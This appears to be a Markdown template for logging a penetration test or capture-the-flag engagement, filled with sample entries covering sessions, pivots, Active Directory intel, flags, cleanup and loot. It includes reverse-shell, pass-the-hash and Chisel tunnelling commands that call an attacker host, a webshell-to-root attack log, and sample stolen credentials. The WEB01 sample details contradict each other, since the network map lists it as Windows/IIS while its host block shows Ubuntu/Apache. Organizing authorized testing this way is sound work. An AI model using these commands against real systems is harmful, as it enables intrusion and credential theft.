# Engagement Loot
**Engagement:** <!-- Name / date -->
**Domain:** <!-- domain.local -->
**Objective:** <!-- e.g. Reach Domain Admin, capture all flags -->
**Started:** <!-- date/time -->
**Ends:** <!-- date/time -->
**Time Remaining:** <!-- update this periodically -->

---

## Scope

**In Scope:**
- <!-- 10.129.x.x/24 — external network -->
- <!-- 172.16.x.x/24 — internal network (pivot required) -->
- <!-- app.domain.local — web application -->

**Out of Scope:**
- <!-- 10.129.x.100 — shared infrastructure, do not touch -->
- <!-- Any third-party / cloud systems not explicitly listed above -->

---

## Active Sessions

> Update this whenever you open or lose a shell. Your quick reference when returning after a break.

| # | Host | IP | User | Method | How to Reconnect | Status |
|---|------|----|------|--------|-----------------|--------|
| 1 | WEB01 | 10.129.x.x | root | nc reverse shell | `nc -lvnp 4444` then trigger webshell | 🟢 alive |
| 2 | DC01 | 172.16.x.x | administrator | evil-winrm | `evil-winrm -i 172.16.x.x -u administrator -H HASH` | 🔴 dead |

> **Status:** 🟢 alive · 🟡 unstable · 🔴 dead / needs re-establishing

---

## Network Map

```
ATTACKER
10.10.14.x
    │
    ▼ (VPN)
[ External / DMZ Subnet: 10.129.x.x/24 ]
    ├── 10.129.x.x   WEB01      Windows Server 2019   IIS/SMB     [FOOTHOLD]
    └── 10.129.x.x   MAIL01     Ubuntu 20.04           SMTP/IMAP   [untouched]
            │
            ▼ (pivot via WEB01)
[ Internal Subnet: 172.16.x.x/24 ]
    ├── 172.16.x.x   DC01       Windows Server 2019   AD/DNS/LDAP [untouched]
    ├── 172.16.x.x   SQL01      Windows Server 2016   MSSQL       [untouched]
    └── 172.16.x.x   DEV01      Ubuntu 18.04           SSH/HTTP    [untouched]
```

> **Status options:** `untouched` / `scanning` / `foothold` / `user` / `root` / `DA` / `blocked` / `done`
> **`blocked`** = attempted multiple paths, stuck — revisit later with new credentials or intel

---

## Flag Tracker

| Flag | Location | Value | Captured |
|------|----------|-------|----------|
| Flag 1 | WEB01 — C:\Users\jsmith\Desktop\user.txt | HTB{...} | ✓ |
| Flag 2 | WEB01 — C:\Users\Administrator\Desktop\root.txt | — | ✗ |
| Flag 3 | DC01 — C:\Users\Administrator\Desktop\root.txt | — | ✗ |

---

## Attack Chain Log

> Chronological record of progress — feeds directly into the report's Attack Chain Narrative

```
[DATE TIME] Started engagement. Confirmed VPN connectivity to 10.129.x.x/24.
[DATE TIME] Nmap full TCP scan of 10.129.x.x/24. Found 2 hosts: WEB01, MAIL01.
[DATE TIME] WEB01 (10.129.x.x): Found exposed .git directory at http://10.129.x.x/.git
[DATE TIME] Dumped git repo with git-dumper. Found DB credentials in config.php.
[DATE TIME] MySQL (3306) open on WEB01. Authenticated with found creds. FILE priv confirmed.
[DATE TIME] Wrote PHP webshell to /var/www/html/shell.php via MySQL INTO OUTFILE.
[DATE TIME] RCE confirmed as www-data. Upgraded to reverse shell.
[DATE TIME] LinPEAS run. Found sudo rule: www-data can run /usr/bin/vim as root NOPASSWD.
[DATE TIME] GTFOBins vim sudo escape. Root on WEB01. Captured user.txt and root.txt.
[DATE TIME] Discovered internal subnet 172.16.x.x/24 via ip a. Set up Chisel SOCKS proxy.
```

---

## Pivot Map

| Hop | From | To | Method | Command / Notes |
|-----|------|----|--------|-----------------|
| 1 | ATTACKER | WEB01 | Chisel SOCKS | `chisel server -p 8080 --reverse` (attacker) / `chisel client attacker:8080 R:socks` (WEB01) |
| 2 | WEB01 | DC01 | proxychains | `proxychains nmap -sT 172.16.x.x` |

> **proxychains config:** `/etc/proxychains4.conf` → `socks5 127.0.0.1 1080`

### Port Forwards

| From | Listen Port | Forwarded To | Target Port | Method | Command |
|------|-------------|--------------|-------------|--------|---------|
| ATTACKER | 1433 | WEB01 → SQL01 | 1433 | SSH -L | `ssh -L 1433:SQL01_IP:1433 user@WEB01` |
| ATTACKER | 5985 | WEB01 → DC01 | 5985 | Chisel | `chisel client attacker:8080 R:5985:DC01_IP:5985` |

---

## AD Domain Info

> Fill in as you enumerate. Centralises domain-level intel that doesn't belong to any single host.

- **Domain Name:** <!-- domain.local -->
- **Domain SID:** <!-- S-1-5-21-... -->
- **Forest Name:** <!-- forest.local (same as domain if single forest) -->
- **Domain Functional Level:** <!-- e.g. Windows Server 2016 -->
- **Domain Controllers:**

| Hostname | IP | OS | Role |
|----------|----|----|------|
| DC01 | 172.16.x.x | Windows Server 2019 | PDC Emulator |

- **Domain Trusts:**

| Trust Direction | Trusted Domain | Type | Transitive | Notes |
|-----------------|---------------|------|------------|-------|
| Bidirectional | child.domain.local | Parent-Child | Yes | — |

- **KRBTGT Hash:** <!-- extract after DCSync; enables Golden Ticket -->
- **Domain Admin Accounts:** <!-- list accounts confirmed as DA -->
- **Enterprise Admin Accounts:** <!-- list accounts confirmed as EA -->
- **ADCS CA Server:** <!-- hostname / IP of Certificate Authority if present -->
- **Key Domain Groups of Interest:**

| Group | Members (controlled) | Notes |
|-------|----------------------|-------|
| Domain Admins | administrator | — |
| Backup Operators | svc_backup | SeBackupPrivilege path to DC |
| DNS Admins | — | DLL injection path to SYSTEM on DC |

---

## Hosts

---

### WEB01
- **IP:** 10.129.x.x
- **OS:** Windows Server 2019 / Ubuntu 20.04
- **Role:** Web server / DMZ
- **Status:** `root`

**Open Ports:**
```
22   SSH     OpenSSH 8.2
80   HTTP    Apache 2.4.41
3306 MySQL   8.0.27
```

**Users Found:**
- `www-data` — web shell / initial foothold
- `jsmith` — found in /home; owns user.txt
- `root` — via sudo vim escape

**Access:**
- [x] Shell as www-data
- [x] Shell as root
- [ ] Persistence (not needed)

**Flags:**
- [x] `user.txt` — `/home/jsmith/user.txt` — `HTB{...}`
- [x] `root.txt` — `/root/root.txt` — `HTB{...}`

**Key Findings:**
- Exposed `.git` directory → source code disclosure → DB credentials
- MySQL FILE privilege → webshell write
- sudo vim NOPASSWD → root

**Tried / Dead Ends:**
- SSH brute force — failed, key auth only
- LFI in `/index.php?page=` — patched

**Tools Transferred:**
- [ ] `/tmp/linpeas.sh` — LinPEAS
- [ ] `/tmp/chisel` — pivot tool

**Next Steps:**
- [x] Complete — pivot to internal subnet

---

### DC01
- **IP:** 172.16.x.x
- **OS:** Windows Server 2019
- **Role:** Domain Controller
- **Status:** `untouched`

**Open Ports:**
```
<!-- fill in after scan -->
```

**Users Found:**
<!-- fill in -->

**Access:**
- [ ] Initial access
- [ ] User
- [ ] Admin / DA

**Flags:**
- [ ] `root.txt` — location TBD

**Key Findings:**
<!-- fill in -->

**Tried / Dead Ends:**
<!-- fill in -->

**Tools Transferred:**
<!-- fill in — track everything for cleanup -->

**Next Steps:**
- [ ] Scan with proxychains
- [ ] SMB null session check
- [ ] Test WEB01 credentials
- [ ] BloodHound collection once domain access obtained

---

<!-- Copy the host block above for each new host discovered -->

---

## End-of-Engagement Cleanup Checklist

> Complete before closing out. Cross-reference the Tools Transferred list in each host block.

| Host | Tools Removed | Persistence Removed | Configs Restored | Confirmed Clean |
|------|--------------|--------------------|-----------------:|-----------------|
| WEB01 | [ ] | [ ] | [ ] | [ ] |
| DC01 | [ ] | [ ] | [ ] | [ ] |

**Cleanup steps per host:**
- [ ] Delete all uploaded tools and binaries
- [ ] Delete webshells and any files written to the web root
- [ ] Remove cron jobs, scheduled tasks, and registry autoruns added during testing
- [ ] Remove any accounts created during testing
- [ ] Remove SSH authorized_keys entries added during testing
- [ ] Revert any configuration changes (enabled services, modified ACLs, etc.)
- [ ] Confirm no listeners or callbacks are still running on target hosts
- [ ] Document everything removed in the report

**Report delivery:**
- [ ] Report delivered via encrypted channel
- [ ] All engagement data stored securely per retention policy
- [ ] Sensitive client data scheduled for destruction after retention period

---

## Miscellaneous Loot

### Interesting Files Found
| File | Host | Path | Contents |
|------|------|------|----------|
| config.php | WEB01 | /var/www/html/config.php | DB creds: root/SuperSecret123 |
| id_rsa | WEB01 | /home/jsmith/.ssh/id_rsa | SSH key — works for jsmith@DEV01 |

### Internal Network Intelligence
- Internal DNS: 172.16.x.x (DC01)
- Domain: domain.local
- Subnet discovered via WEB01: 172.16.x.x/24
- ARP cache on WEB01 revealed: DC01, SQL01, DEV01

### Shares Found
| Host | Share | Access | Contents |
|------|-------|--------|----------|
| DC01 | SYSVOL | read | GPP password found in Groups.xml |
| SQL01 | Backups | read | SQL backup files |
